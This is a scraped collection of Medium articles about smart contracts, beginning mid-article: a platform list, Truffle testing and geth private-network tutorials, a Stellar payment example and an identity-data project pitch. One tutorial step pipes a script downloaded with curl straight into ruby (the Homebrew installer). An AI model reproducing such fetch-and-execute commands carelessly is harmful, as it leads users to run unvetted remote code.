once. The corresponding public keys (or it\u2019s anonymous IDs) are normally mentioned in the contract body so the system can check whether the mentioned key was used to sign the contract.The contract\u2019s capsule contains no encrypted data, as the part of the contract known to the Universa network should not include any sensitive private data. Instead, such a data must be attached to the contract as signed references (to external files, for example) and will never be transferred to the Universa network, both reducing the unnecessary traffic and protecting private information.Learning Resources: Universa Docs, UniversaUniversa Reddit | Universa GitHub | Universa Telegram35. UrbitSmart Contract Language: HoonStatus: LiveExplanation: Urbit is a secure peer-to-peer network of personal servers, built on a clean-slate system software stack. It uses Ethereum for its functioning.One simple way to think about Urbit is as a \u201cpersonal blockchain.\u201d Like a blockchain, Urbit is a deterministic virtual computer. Its semantics are defined by a frozen lifecycle function, which maps its event history to its current state. But, unlike a blockchain, an Urbit instance is a private computer for one user, not a public record for everyone.Urbit\u2019s lifecycle function is a nano-interpreter called Nock. A typed functional language, Hoon, compiles itself to Nock. An event-driven OS, Arvo, is written in Hoon. Everything above Nock can upgrade itself over Urbit\u2019s own overlay packet network, Ames. Ames is live and stable with test keys.Our Urbit interpreter runs on any Unix machine. The Urbit server is a single-level store\u200a\u2014\u200aboth database and application engine. Every Urbit event is a transaction. Urbit is semantically frozen and cannot call out to Unix.Your Urbit instance is your personal server. Your urbit should eventually contain and manage your whole digital life. You may compute at home or in the cloud, based on your security/privacy tradeoff, but Urbit\u2019s formal semantics makes ships trivial to migrate. You\u2019ll never be locked in to one computing provider.Learning Resources: Urbit Docs, UrbitUrbit GitHub | Urbit Reddit | Urbit Telegram36. SoilPros:Same as of EthereumCons:Same as of EthereumSmart Contract Language: SolidityStatus: LiveExplanation: SOILcoin is an Ethereum-parallel cryptocurrency, using smart contracts and distributed applications (dApps) run over a \u201cglobal computer network\u201d secured by blockchain technology utilizing the Dagger algorithm. This \u201cEthereum Virtual Machine\u201d (EVM) is fueled by the digital currency called SOIL, which acts as the gas that runs the computational processes on the SOILcoin network, and is minted through Proof of Work mining.Learning Resources: Soil Docs37. ExpansePros:Same as of EthereumCons:Same as of EthereumSmart Contract Language: SolidityStatus: LiveExplanation: It is regarded as first stable fork of Ethereum and its smart contract implementation is same as of Ethereum.Learning Resources: CryptoZombies, Solidity Docs, OpenZeppelin38. UbiqPros:Same as of EthereumCons:Same as of EthereumSmart Contract Language: SolidityStatus: LiveExplanation: Ubiq is a fork of Ethereum with some improvements, but those alterations don\u2019t effect much on it\u2019s smart contract implementation.Learning Resources: CryptoZombies, Solidity Docs, OpenZeppelin, Alex Sterk39. Ethereum\u00a0ClassicPros:Same as of EthereumCons:Same as of EthereumSmart Contract Language: SolidityStatus: LiveExplanation: It is a fork of Ethereum and its smart contract implementation is same as of Ethereum.Learning Resources: CryptoZombies, Solidity Docs, OpenZeppelin40. MonaxPros:Same as of EthereumCons:Same as of EthereumSmart Contract Language: SolidityStatus: LiveExplanation: Monax includes a reimplementation of the Ethereum Virtual Machine and also provides software development kits.Learning Resources: Monax docs", "responses": "8"}, {"title": "Let\u2019s Build Your First Smart Contract in Solidity and\u00a0Truffle", "author_name": "Amazingandyyy", "link": "https://medium.com/etherereum-salon/hello-ethereum-solan-contract-4643118a6119?source=search_post", "post_date": "Jul 30, 2017", "readtime": "6 min read", "upvotes": "872", "content": "Let\u2019s Build Your First Smart Contract in Solidity and\u00a0TruffleAmazingandyyyBlockedUnblockFollowFollowingJul 30, 2017Everyone is talking about Blockchain/Ethereum/Smart Contracts, and the price of Ether just went up and down. In my opinion, to know the value of ether and to take the advantage of this Blockchain Technology, getting hands on and diving into the smart contract development is the best and most effective way. I hope this series of tutorials will inspire you and lead you to start learning and applying smart contracts.After this extremely short tutorials, you can tell people,I just build my first smart contract this morning! [plus learned to\u00a0debug]In this first tutorial, you will learn writing solidity language and truffle CLI tool to write and deploy a hello-world contract in a reasonably short amount of time.All resources are available in my GitHub repo as following.amazingandyyy/the-good-ethereum-smart-contract-tutorialthe-good-ethereum-smart-contract-tutorial - Repo for The Complete Ethereum Smart Contract Development tutorials series.github.com", "responses": "7"}, {"title": "Testing Your Smart Contracts With JavaScript (Including Async/Await Promises)", "author_name": "Gustavo (Gus) Guimaraes", "link": "https://medium.com/@gus_tavo_guim/testing-your-smart-contracts-with-javascript-40d4edc2abed?source=search_post", "post_date": "Oct 20, 2017", "readtime": "5 min read", "upvotes": "814", "content": "Testing Your Smart Contracts With JavaScript (Including Async/Await Promises)Gustavo (Gus) GuimaraesBlockedUnblockFollowFollowingOct 20, 2017[ The code for this blog post can be found here: https://github.com/gustavoguimaraes/smart-contract-testing-javascript-example-]Smart contract developers strive to mitigate bugs in their code as they can be literally costly. For this end, one of the techniques we use is to write tests extensively or dare I say obsessively to the codebase.In this post I will show you how to start testing your smart contracts from the get go.Show me the green light to move\u00a0forwardFirst off, these are the dependencies I used to create this tutorial. If you come across an error, you can try installing and using these versions.- node@8.5.0- truffle@^4.0.0- ethereumjs-testrpc@^4.0.1With the dependencies out of the way, let\u2019s set up the project.mkdir smart-contract-test-example && cd \"$_\" && truffle init webpackThe snippet above creates a directory, changes into it and initializes Truffle with webpack.Now create the test file for the FundRaise smart contract we\u2019ll build.touch test/fundRaise.jsOpen the file in your favorite text editor and add the most basic test structure.const FundRaise = artifacts.require('./FundRaise.sol')contract('FundRaise', function () {})They first line fetches the contract artifacts. It is the contract abstraction containing its primary information i.e. its ABI, address and the like.Then we create the function contract() which is similar to the describe() function in Mocha, except that Truffle adds some features such as making sure the contracts are deployed before running the tests. By the way, Truffle uses the Mocha testing framework as well as Chai assertion library under the hood.Now let\u2019s run this barebones test.First:testrpcThen open a new command line window and typetruffle test test/fundRaise.jsThe outcome is:Error: Could not find artifacts for ./FundRaise.sol from any sources    at Resolver.require (/usr/local/lib/node_modules/truffle/build/cli.bundled.js:49072:9)    at TestResolver.require (/usr/local/lib/node_modules/truffle/build/cli.bundled.js:89733:30)...This is because we haven\u2019t coded up the FundRaise smart contract just yet. Let\u2019s fix this.touch contracts/FundRaise.solThen add the codepragma solidity ^0.4.17;contract FundRaise {}Run the test again: 0 passing (1ms)Right. No tests written yet.Smart Contract Specification and Adding TestsThe FundRaise smart contract will be a simple contract. Its straightforward specification is:it has an ownerit accepts fundsit is able to pause and un-pause the fundraising activitycontract owner is able to remove funds from the contract to herself at any time.Let\u2019s start with the first specification\u200a\u2014\u200athe contract has a ownerconst FundRaise = artifacts.require('./FundRaise.sol')contract('FundRaise', function ([owner]) {    let fundRaise    beforeEach('setup contract for each test', async function () {        fundRaise = await FundRaise.new(owner)    })    it('has an owner', async function () {        assert.equal(await fundRaise.owner(), owner)    })})In the test code above we accomplish a few things.1- fancy ES2015 destructuring variable assignment in function([owner] the first parameter given to the contract function is an array with the accounts\u00a0coming\u00a0from\u00a0testrpc. We are taking the first one and assigning it the variable owner\u00a0.2- create the fundRaise variable3- have a beforeEach function which will run before each test creating a new instance of fundRaise each time. Note the use of async/await for promises. This allows for more readable test code. If you want to read up more on the new JavaScript async/await features, this is a good blog post on it.4- create the first test within the it() function block. Here we are asserting that the fundRaise.owner() is the owner that we passed to when creating the contract.Before running the tests once more, head over to truffle.js and require babel-polyfill as we need it to use async/await.truffle.js// Allows us to use ES6 in our migrations and tests.require('babel-register')require('babel-polyfill')module.exports = {  networks: {    development: {      host: 'localhost',      port: 8545,      network_id: '*' // Match any network id    }  }}Run the tests again and you will find this error:...1 failing1) Contract: FundRaise has an owner:     AssertionError: expected undefined to equal '0x676c48fb3979cf2e47300e8ce80a99087589650d'...Now it is time to write the code that will make the first test pass. Let\u2019s flesh out our smart contract a bit.pragma solidity ^0.4.17;contract FundRaise {    address public owner;    // @dev constructor function. Sets contract owner     function FundRaise() {        owner = msg.sender;    }}Trigger the test again, i.e.truffle test test/fundRaise.js\u00a0:Contract: FundRaise    \u2713 has an owner (41ms)1 passing (138ms)Great! Let\u2019s move on and add the next one.const FundRaise = artifacts.require('./FundRaise.sol')  contract('FundRaise', function ([owner, donor]) {    let fundRaise    beforeEach('setup contract for each test', async function () {      fundRaise = await FundRaise.new(owner)    })    it('has an owner', async function () {      assert.equal(await fundRaise.owner(), owner)    })    it('is able to accept funds', async function () {      await fundRaise.sendTransaction({ value: 1e+18, from: donor })      const fundRaiseAddress = await fundRaise.address      assert.equal(web3.eth.getBalance(fundRaiseAddress).toNumber(), 1e+18)    })})The error this time is:1 failing1) Contract: FundRaise is able to accept funds:     Error: VM Exception while processing transaction: invalid opcodeRight, we need to let our contract receive Ether. Let\u2019s fix that.pragma solidity ^0.4.17;contract FundRaise {    address public owner;// @dev constructor function. Sets contract owner     function FundRaise() {        owner = msg.sender;    }        // fallback function that allows contract to accept ETH     function () payable {}}And the result is:Contract: FundRaise    \u2713 has an owner (38ms)    \u2713 is able to accept funds (234ms)2 passing (473ms)Beautiful. This is the process one goes through systematically to cover the smart contracts with test\u00a0written\u00a0in\u00a0JavaScript. Just keep doing this process until all smart contract specifications are met.For simplicity sake, I am going to fast forward the process and add the complete set of tests for the FundRaise contract so you have an idea how it would look like in the end.Note the tests for the pause/unpause and owner receive funds testsand here is the full code for the smart contract:Run the tests one last time\u2026Contract: FundRaise    \u2713 has an owner (46ms)    \u2713 accepts funds (193ms)    \u2713 is able to pause and unpause fund activity (436ms)    \u2713 permits owner to remove funds (653ms)4 passing (2s)Marvelous!Hope you learned a thing or two about testing smart contracts with JavaScript and its use in blockchain development. Now carry on and keep testing the heck out of your smart contracts.The code for this blog post can be found here: https://github.com/gustavoguimaraes/smart-contract-testing-javascript-example-", "responses": "5"}, {"title": "THEKEY and Smart\u00a0Contract", "author_name": "TheKey", "link": "https://medium.com/@thekeyvip/thekey-and-smart-contract-da4f78c10821?source=search_post", "post_date": "Nov 18, 2017", "readtime": "2 min read", "upvotes": "312", "content": "THEKEY and Smart\u00a0ContractTheKeyBlockedUnblockFollowFollowingNov 18, 2017Recently, an expert team focusing on the application and development of Personal Identity Information (PII), THEKEY, has announced the completion of technical and commercial testing of the project. The team believes, THEKEY will be the fundamental basis to integrate the cross-industry big data, and a crucial support for the prospective Artificial Intelligence (AI), machine learning and neural network.A smart contract is a contract that can be executed automatically on a computer system when certain conditions are met.One of the prospects of THEKEY project is to manage data transactions in a unified network environment through smart contracts, and to create a transparent and secure cross-organizational network where governments, healthcare companies and other organizations are able to share sensitive information. This will help users to utilize their personal data assets. Through personal authorization, an individual can benefit from sharing personal data with medical institutions, pharmaceutical companies and insurance companies, while these institutions can provide more quality and accurate medical services based on the personal data.With the Blockchain Based Dynamic Multi-dimension Identification (BDMI) as the core, THEKEY project forms the unique digital identity and corresponding public and private key for the users. After that, the local node on blockchain will extract the PII in accordance with the data desensitization and data hierarchy rules. The sensitive data will be encrypted, while the desensitized data will be sent to the server and recorded on blockchain. After the pharmaceutical and insurance companies send the request through THEKEY system, the user can carry out a long-term or temporary authorization regarding his/her personal data, then the system triggers and implements the smart contract, and execute the transaction based on the smart contract.With years\u2019 experiences in human resources and social security as well as the healthcare industry, THEKEY team has created an online identity verification solution which will bring a whole new picture to the blockchain ecosystem.For more information, please visit THEKEY official website: www.thekey.vip or join the telegram for discussion: https://t.me/joinchat/FkZtERGQ1qUEU7iAzC6xVQThis is a scenario where the human resources and social security (HRSS) data is applied to the smart contract in THEKEY\u00a0project", "responses": ""}, {"title": "How To Decipher A Smart Contract Method\u00a0Call", "author_name": "Howard", "link": "https://medium.com/@hayeah/how-to-decipher-a-smart-contract-method-call-8ee980311603?source=search_post", "post_date": "Sep 18, 2017", "readtime": "11 min read", "upvotes": "1.2K", "content": "How To Decipher A Smart Contract Method\u00a0CallHowardBlockedUnblockFollowFollowingSep 18, 2017Diving Into The Ethereum VM Part\u00a04In previous articles of this series we\u2019ve seen how Solidity represents complex data structures in the EVM storage. But data is useless if there\u2019s no way to interact with it. The Smart Contract is the mediator between data and the outside world.In this article we\u2019ll see how Solidity and EVM makes it possible for external programs to call a contract\u2019s methods and cause its state to change.The \u201cexternal program\u201d is not limited to DApp/JavaScript. Any program that can communicate with an Ethereum node using HTTP RPC can interact with any contract deployed on the blockchain by creating transactions.Creating a transaction is like making an HTTP request. A web server would accept your HTTP request and make changes to the database. A transaction would be accepted by the network, and the underlying blockchain extended to include the state changes.Transactions are to Smart Contracts as HTTP requests are to web services.", "responses": "7"}, {"title": "I Just Wrote a Stellar Smart\u00a0Contract", "author_name": "Robert Durst", "link": "https://medium.com/@robdurst/i-just-wrote-a-stellar-smart-contract-7f54a391f5e1?source=search_post", "post_date": "Feb 21, 2018", "readtime": "4 min read", "upvotes": "817", "content": "I Just Wrote a Stellar Smart\u00a0ContractRobert DurstBlockedUnblockFollowFollowingFeb 21, 2018In 1996, the same year I was born \ud83d\ude0a, Nick Szabo first coined the term \u201csmart contract\u201d in his paper Smart Contracts: Building Blocks for Digital Free Markets:\u201cA smart contract is a set of promises, specified in digital form, including protocols within which the parties perform on these promises.\u201d22 years later, the term \u201csmart contract\u201d is synonymous with Ethereum\u2019s Turing complete Solidity and is responsible for everything from cryptographic cat auctions to provably fair Fate Channels. So when I needed to implement a logic-based payment funnel, it seemed Solidity was the best choice\u200a\u2014\u200athe quality of developer support available rivals none. But as Herb Brook famously said \u201cI\u2019m not looking for the best one, I am looking for the right one.\u201dThe ProblemHere is an overview of what I looked to solve.Let\u2019s say Bob owns a house construction company and Charlie and Diego work for Bob. Alice is looking to build a house and she only owns cryptocurrency. Lucky for her, Bob\u2019s construction company is willing to accept her crypto. So, Alice goes to Bob and says \u201cBob, will you build me a house?\u201dBob responds \u201cyes I will, but under one condition. If we fail to build the house, we will only refund part of your payment.\u201d (Bob and Charlie must be paid, but Diego should only be paid if the house is successfully built)Alice responds \u201cok, I agree. I will draft a smart contract dictating these terms and get back to you tomorrow.\u201dSo what should Alice do?Ethereum\u00a0!= Right\u00a0ChoiceMy first instinct:npm install -g trufflecd ~/smartContracttruffle initFor those who are unfamiliar with the Truffle framework, I highly recommend checking it out.With Truffle up and running, I began constructing a proof of concept Ethereum smart contract. Ultimately I came up with a distributor contract that acted as an escrow between Alice and Bob and then distributed funds based on a binary outcome; Alice gives Bob the funds for the service and once the service is complete, Bob distributes the funds accordingly. This came out to be 100+ lines of code and several days of battling through the intricacies of the Solidity programming language. As a novice smart contract engineer, I can say with certainty, this code was not error free and was very likely insecure.Yet for weeks, this was the contract I tested, refactored, and considered the best possible solution.That all ended when I came across this article.A Stellar Smart Contract\u2026 Da Fuq?Stellar Smart Contracts\u2026 Yes I Just Wrote\u00a0ThatStellar smart contracts. WHAT?!?!? I had to test this out and see if it was real. Starting from scratch, I reconsidered the problem at hand.Essentially, my problem boiled down to this:IF HOUSE BUILT --> pay Bob, Charlie, DiegoELSE           --> pay Bob, CharlieEasy, eh? With a clearer understanding of the simplicity of the problem I sought to solve, I began reading through Stellar\u2019s documentation and honed in on their definition of a transaction. I came across the following properties:a) composed of operations\u200a\u2014\u200ain the world of Stellar, a transaction is a series of operations that are grouped together and signed by each of the acting accountsb) atomic\u200a\u2014\u200athe transaction succeeds or fails; there is no middle statec) sequence number\u200a\u2014\u200aeach transaction is assigned a sequence number, allowing the transaction constructor to determine the order of transaction execution. On the Stellar network, sequence numbers must be strictly increasing\u200a\u2014\u200aafter the N transaction is executed, the next valid transaction is N+1\u2026 a transaction with N or N+2 will fail.Using these three simple properties, I created a \u201csmart contract\u201d:PROBLEM:Consider the user A who seeks to pay B,C,D for a service. If the service succeeds, B,C, and D are paid. If the service fails, only B and C are paid. B is a trusted party, capable of determining whether the service succeeds or fails.SETUP:A   balance:    9 XLM   sequence #: 3A constructs two transactions:TX A:Sequence #4                               Pay B 3 XLMpay C 3 XLMPay D 3 XLMTX B:Sequence #4Pay B 3 XLMpay C 3 XLMA signs both these transactions and gives them to B.EXECUTION:IF SUCCESS: B broadcasts TX AELSE      : B broadcasts TX BBoom\u2026 a minimal logic-based payment funnel implementable in under 20 lines of code (and I can even use javascript \ud83d\ude0d).Note: in both cases I trust B to act honestly and determine the outcome of the services.So Is This a Smart Contract?Let\u2019s go back to Szabo\u2019s original definition of smart contract:\u201cA smart contract is a set of promises, specified in digital form, including protocols within which the parties perform on these promises.\u201dpromises: Alice will pay Bob,Charlie, and Diego based on the outcome of the service.specified in digital form: pick your favorite language.within which the parties perform on these promises: Bob, Charlie, and Diego attempt to build the house, with the guarantee that success will result in payment.So is this a smart contract?!?So What, Who\u00a0Cares?Sure CryptoKitties may require a Turing complete smart contracting language. Sure Fate Channels probably can\u2019t be implemented using a combination of Stellar\u2019s 11 operations. Sure Stellar\u2019s smart contracts are not a replacement for Solidity. However, in certain situations, Stellar\u2019s transaction construction capabilities may offer a simpler, more effective smart contract solution (and with 10000x less fee\u2019s).Disclaimer: While I am a current employee of Stellar.org, these views represent my own and not those of SDF. These conclusions were developed while experimenting during my free time and were not necessarily influenced by my daytime occupation.Disclaimer continued: While I stand by my words, I am a novice smart contract programmer and may be incorrect in my assumptions. If so, please comment below\u200a\u2014\u200athis is an open project and I am looking for feedback.", "responses": "11"}, {"title": "Beginner\u2019s guide to blockchain/Ethereum (1)\u200a\u2014\u200aBuild a smart contract on a private\u00a0network", "author_name": "\u674e\u5a77\u5a77 Lee Ting Ting", "link": "https://medium.com/taipei-ethereum-meetup/a-complete-guide-on-building-a-smart-contract-on-a-private-net-in-ethereum-726851c7c044?source=search_post", "post_date": "Jun 29, 2017", "readtime": "6 min read", "upvotes": "688", "content": "Beginner\u2019s guide to blockchain/Ethereum (1)\u200a\u2014\u200aBuild a smart contract on a private\u00a0network\u674e\u5a77\u5a77 Lee Ting TingBlockedUnblockFollowFollowingJun 29, 2017Overview & IncentiveSince many tutorials, including the official tutorial on ethereum.org, have some errs(ex. the updated version of geth removed the solidity compiling function) which make it harder for beginners like me to get started, I decided to write this tutorial in the hope of expanding the Ethereum community.I\u2019m using mac. If you encounter any problem, please kindly let me know in the comments so I can update it accordingly:)Open source tools & language used:Solidity: smart contract programming languagegeth (version 1.5.9): CLI for running ethereum nodebrew: package manager for MacOS.Install it by typing this command in terminal:/usr/bin/ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"Start coding!As starting from geth version 1.6.0, compiling solidity is no longer available, we cannot install it directly using brew(only the newest version package is provided there). Here we use geth version 1.5.9 and build it from source code.Download Source code (tar.gz)In terminal:cd \u201cpath of the file you just downloaded\u201d// in Mac, you can simply drag the folder to console to get the pathmake gethThis will generate an executable file in the \u201cyour current directory\u201d/build/bin folder which can be moved to wherever you want to run it from. The binary is stand alone and doesn\u2019t require any additional files.(Reference: https://github.com/ethereum/go-ethereum/wiki/Installing-Geth#build-it-from-source-code )2. Then, create alias:echo \"alias geth159='your_folder_path/build/bin/geth'\" >> ~/.bashrcIn my case, it is /Users/tina/Desktop/go-ethereum-1.5.9/build/bin/gethTo make the changes affected immediately:source ~/.bashrcTo make what you editted in ~/.bashrc available upon every loginecho \"source ~/.bashrc\" >> ~/.profileNow you can type geth159 whenever you want to launch geth\u00a0:)3. Install Solidity compilerbrew install solidity4. launch your private netFirst create a folder to store your blockchain datamkdir privchainUse geth to launch itgeth159 --rpc --rpcaddr 127.0.0.1 --rpcport 8545 --dev --datadir privchain(Reference: https://github.com/ethereum/go-ethereum/wiki/Command-Line-Options, https://stackoverflow.com/questions/33826018/in-ethereum-what-is-a-private-testnet-why-would-i-want-it-and-how-do-i-set-it )Should see something likeINFO\u2026. IPC endpoint opened: /Users/tina/privchain/geth.ipcINFO\u2026.HTTP endpoint opened: http://127.0.0.1:8545And if you open a new console and cd privchain then ls\u00a0, you can see the originally empty dir is now having geth, geth.ipc, and keystore5. Keep that Ethereum node running and open a new terminal. Use \u201cgeth attach\u201d to connect to the node and open geth consolegeth159 attach ipc://Users/tina/privchain/geth.ipc // use your own ipc url here!6. Now use the api commands as specified here https://github.com/ethereum/go-ethereum/wiki/JavaScript-Console#personallistaccounts(In geth console)personal.listAccountsoutput: []personal.newAccount('') // you can enter your password like newAccount(\u2018password_ya\u2019)output: [0x\u2026\u2026.] // your newly created account address.Note that every time a new account is created, you should see\u00a0.\u201d..New wallet appeared..\u201d In the console where you opened your private netpersonal.listAccounts // just to make sure you hv made the account successfullyoutput: [0x\u2026\u2026\u2026]7. Use the ethereum js api as specified here https://ethereumbuilders.gitbooks.io/guide/content/en/ethereum_javascript_api.html(in geth console)web3.eth.coinbase // This property is read only and returns the coinbase address where the mining rewards go to.output: [0x\u2026\u2026\u2026] // the output should be the same as your newly created account address, cause it takes the first account you created as default value8. Create your smart contract!source = \"contract test { function multiply(uint a) returns(uint d){return a * 7;}}\"9. Make sure your solidity compiler is installedweb3.eth.getCompilers() // the output should be [\"Solidity\"]10. Compile your codecode = web3.eth.compile.solidity(source)The output(the \u201ccode\u201d you just created) is like a json object. The highlighted part is your bytecode, which you will need to create a smart contract, and the abi array, respectively.{<stdin>:test: {    code: \"0x60606040523415600b57fe5b5b60918061001a6000396000f300606060405263ffffffff7c0100000000000000000000000000000000000000000000000000000000600035041663c6888fa181146039575bfe5b3415604057fe5b6049600435605b565b60408051918252519081900360200190f35b600781025b9190505600a165627a7a723058206a8cbef13138690601a279c73e208f9dcf42e4678d860038475fe555599593d60029\",    info: {        abiDefinition: [{...}],        compilerOptions: \"--combined-json bin,abi,userdoc,devdoc --        add-std --optimize\",        compilerVersion: \"0.4.11\",        developerDoc: {            methods: {}         },        language: \"Solidity\",        languageVersion: \"0.4.11\",        source: \"contract test { function multiply(uint a) returns(uint d){return a * 7;}}\",        userDoc: {            methods: {}        }    }}}*What is abi? You can see this as an api for machines as explained here.When you write source code, you access the library though an API. Once the code is compiled, your application accesses the binary data in the library through the ABI.11. Create a contract object by its abiMyContract = web3.eth.contract(code[\"<stdin>:test\"].info.abiDefinition)(Official document on how to create a contract: https://github.com/ethereum/wiki/wiki/JavaScript-API#web3ethcontract )12. Check if you have a default coinbase account (to which your mining reward goes) with etherFirst set your coinbase address as account1account1 = web3.eth.coinbaseThen Check its balanceweb3.eth.getBalance(account1)If the output is larger than 0, go on to the next step:Otherwise, start mining to get some ether in it!miner.start()You should see the mining in progress in the other terminal where you opened your private netStop when you feel like having sufficient funds\u00a0;pminer.stop()Check your balance againweb3.eth.getBalance(account1)13. Unlock account to enable it to send transactions (In this case, we have to pay the gas price for contract deploy). Here we use account1.personal.unlockAccount(account1, '') // you can replace '' with the password you set previously14. Next, init the contract using the compiled code. In this case, it is code[\u201c<stdin>:test\u201d].codeYou can also use other ways (ex. brower-solidity) to compile the contract and get this code. Here, replace the contract code with our \u201csource\u201d contract code, and click \u201ccontract details\u201d at the bottom-right corner and you would be able to see the same bytecode.*Note: browser solidity cannot work on safari. You can use chrome instead.*Note: you can also set the contract to a previous one using the address of the contract you created before (contractInstance = MyContract.at(\u201caddress\u201d);)bytecode = code[\"<stdin>:test\"].codeEstimate how many gas you will need to deploy this contractweb3.eth.estimateGas({data: bytecode})15. Deploy contract and set callback function for our better understanding\u00a0:)contractInstance = MyContract.new({data: bytecode gas: 1000000, from: account1}, function(e, contract){if(!e){if(!contract.address){console.log(\"Contract transaction send: Transaction Hash: \"+contract.transactionHash+\" waiting to be mined...\");}else{console.log(\"Contract mined! Address: \"+contract.address);console.log(contract);}}else{console.log(e)}})Note: The value of param \u201cgas\u201d can be anything higher than the estimated gas costsNote: you may have to unlock your account1 again here.Now you should seeIn this console:Contract transaction send: Transaction Hash: \u201cyour_transaction_hash\u201d waiting to be mined\u2026In the other console for starting the private net:\u2026 created \u201cyour_transaction_hash\u201d16. Your contract is now waiting be mined. You should see \u2018Contract mined!` soon after the mining starts. After that, you can stop mining.miner.start()After you seeContract mined! Address: 0xf1bc128edf9d7d4a7d567b50c1d8080cf58ef068Ctrl+c to go back to geth console and typeminer.stop()Note: Ctrl+C is to interrupt any process return to the simple console mode. Ctrl+D is to exit the console17. Last, check if your contract is created successfullyeth.getCode(contractInstance.address) // the output should be the same as your bytecode18. Call our contract functioncontractInstance.multiply.call(6) // replace 6 with any unsigned intOutput: 42Note: call() is a local invocation of a contract function that does not broadcast or publish anything on the blockchain. The command \u201ccontractInstance.multiply(6)\u201d will not work.(Reference: https://ethereum.stackexchange.com/questions/765/what-is-the-difference-between-a-transaction-and-a-call)Learn more\u00a0through\u2026Another great guide on the greeter tutorial:https://samsclass.info/141/proj/pEth1.htmCovers how to make a contract available to other machines on the same private network and how to delete a contract2. Blockchain visualization and charts:https://etherscan.io/Wrap upNow you know how to set up a private network, mine ethers, compile and run smart contracts in Solidity.This is actually my first article and first tutorial. Share it if you like it. I\u2019m open to any suggestions! Thank you:)", "responses": "9"}, {"title": "How to build an ICO on NEO with the NEX ICO smart contract\u00a0template", "author_name": "Chris Hager", "link": "https://medium.com/proof-of-working/how-to-build-an-ico-on-neo-with-the-nex-ico-smart-contract-template-1beac1ff0afd?source=search_post", "post_date": "Dec 19, 2017", "readtime": "8 min read", "upvotes": "1.3K", "content": "How to build an ICO on NEO with the NEX ICO smart contract\u00a0templateChris HagerBlockedUnblockFollowFollowingDec 19, 2017This post dives into the neo-ico-template of the Neon Exchange (NEX), and how to use it as an ICO developer to configure, compile, deploy and test the ICO smart contract.The whole process includes the following steps:Adapting the ICO template to your needsCompiling the contract template into NEO bytecode (.avm file)Deploying the compiled smart contract using neo-pythonInvoking methods on the deployed contract (deploy, mintTokens, balanceOf,\u00a0\u2026)For testing purposes we will use a private network of the NEO blockchain", "responses": "7"}, {"title": "How to write and deploy your first smart\u00a0contract", "author_name": "Avadhoot Kulkarni", "link": "https://medium.freecodecamp.org/how-to-write-and-deploy-your-first-smart-contract-341d5e2ffb35?source=search_post", "post_date": "May 17, 2018", "readtime": "6 min read", "upvotes": "896", "content": "How to write and deploy your first smart\u00a0contractAvadhoot KulkarniBlockedUnblockFollowFollowingMay 17, 2018Ever since Ethereum graced the crypto space with its presence in mid-2015, the revolutionary invention by Canadian-Russian Programmer Vitalik Buterin has given birth to many new decentralised applications (dApps). Along with the myriad of dApps being built, Ethereum\u2019s success is mainly attributed to its implementation of smart contracts.Interestingly enough, the invention of smart contracts dates back to 1996. Computer scientist Nick Szabo drew up the term \u201csmart contracts,\u201d and explains them as follows:\u201cI call these new contracts \u201csmart\u201d, because they are far more functional than their inanimate paper-based ancestors. No use of artificial intelligence is implied. A smart contract is a set of promises, specified in digital form, including protocols within which the parties perform on these promises\u201d\u2014 Nick Szabo,\u00a01996His work later went on to inspire many other researchers and scientists, including Vitalik, who created Ethereum.Basic infoBefore we delve further into the guide, it is important to understand two important concepts.The first thing that we need to understand is what the Ethereum Virtual Machine (EVM) is. Its sole purpose is to act as a runtime environment for smart contracts based on Ethereum. Think of it as a global super computer that runs all the smart contracts. As the name suggests, the EVM is virtual and not a physical machine. You can read more about the EVM here.The second concept we need to understand is what is gas. In the EVM, gas is a unit of measurement used to assign a fee to each transaction with a smart contract. Each computation that happens in the EVM requires gas. The more complex and tedious it is, the more gas is needed to execute the smart contract.Every transaction specifies the gas price it is willing to pay in ether for each unit of gas, allowing the market to decide the relationship between the price of ether and the cost of computing operations (as measured in gas). It\u2019s the combination of the two, total gas used multiplied by gas price paid, that results in the total fee paid by a transaction.Fee for transaction = Total gas used * gas price;Read more about gas here.Now that you have basic knowledge about what a smart contract is and how the smart contract runs, we can go straight into how we are going to make our very own smart contract!Setting upWe\u2019re going to use a tool for this: Pragma. It\u2019s an easy-to-use platform for creating and deploying smart contracts. Sign up here and go the editor:Log in to Metamask. If you haven\u2019t installed MetaMask yet, you can start here.Switch to the Kovan test network both in Pragma and MetaMask.Just to give you a brief overview about testnets, check out this article.The Ethereum mainnet is the official Ethereum network. It is more secure, and uses Ether, which has real monetary value.Testnets are playground Ethereum networks in which the Ether is agreed to have no monetary value. Developers use these playgrounds to test applications before deploying them to the mainnet for their users.To switch between these networks, click on the network name next to the MetaMask icon and select the network. For this tutorial, please choose Kovan.Writing the smart\u00a0contractThe following contract will implement the simplest form of a cryptocurrency. It is possible to generate coins out of thin air, but only the person that created the contract is able to do that (it is trivial to implement a different issuance scheme). Furthermore, anyone can send coins to each other without needing to register with a username and password. All you need is an Ethereum keypair.This code basically lets you mint and send tokens to other accounts.Let\u2019s go through it line by line:pragma solidity ^0.4.21;This indicates that the source code is written for Solidity version 0.4.21 or anything newer that does not break functionality. This is to ensure that the code doesn\u2019t behave differently with the new compiler versions.contract yourTokenEverything related to yourToken goes inside this contract. Essentially, a contract in solidity is the collection of functions and state (code and data) sitting at an address on the Ethereum blockchain.address public minter;This is the address of the minter. The keyword \u201cpublic\u201d makes those variables readable from outside.event Sent(address from, address to, uint amount);Events allow light clients (UI) to react to the changes efficiently.function yourToken() public {minter = msg.sender;}Let\u2019s set your Ethereum address as minter of the contract. You\u2019ll need to access the contract through your MetaMask to be able to mint. We\u2019ll go through this again after deploying the contract.function mint(address receiver, uint amount) public {if(msg.sender != minter) return;balances[receiver]+=amount;}This function lets you mint the amount of coins you want to. You can mint as many tokens as you want to. The if condition tells the system to stop executing if you\u2019re not the minter, which is set in yourToken function.If you are in fact the minter, it lets you mint the tokens.function send(address receiver, uint amount) public {if(balances[msg.sender] < amount) return;balances[msg.sender]-=amount;balances[receiver]+=amount;emit Sent(msg.sender, receiver, amount);}This is a function that lets one address send the tokens to another address. It takes two parameters: receiver and amount. It reduces the amount from the sender\u2019s address and adds the same amount to receiver\u2019s address. Event Sent, which we declared earlier, is now used to do the transfer. Currently, we have kept the sender as msg.sender, which is the minter, as we do not want to complicate the contract.That\u2019s it. Your contract is now ready, so let\u2019s compile it.Compiling and deploying the smart\u00a0contractOnce the contract is compiled, let\u2019s deploy it on the blockchain. As mentioned earlier, we\u2019ll use Kovan testnet to deploy the contract.Check if the smart contract is deployed.For the contract I deployed for this tutorial, this is the transaction. You can also see it in Pragma under your contracts.Interact with the smart contract 